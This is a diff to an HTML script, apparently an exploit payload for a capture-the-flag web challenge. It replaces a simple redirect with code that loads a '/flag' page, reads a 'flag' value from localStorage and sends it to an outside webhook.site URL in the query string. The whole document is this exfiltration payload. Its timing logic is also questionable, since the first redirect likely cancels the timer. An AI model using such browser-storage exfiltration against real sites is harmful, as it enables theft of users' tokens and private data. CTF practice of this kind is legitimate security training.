@@ -1,4 +1,10 @@
 <script>
-  localStorage.setItem('check', '1');
-  window.open("http://traefik/flag", "_self");
+    // Step 1: go to /flag (re-trigger flag setting)
+    location.href = "http://traefik/flag#exfil";
+    
+    // Step 2: after ~3s delay (for flag to be set), redirect to your webhook with localStorage content
+    setTimeout(() => {
+        const f = localStorage.getItem("flag");
+        location.href = "https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?f=" + encodeURIComponent(f);
+    }, 3000);
 </script>
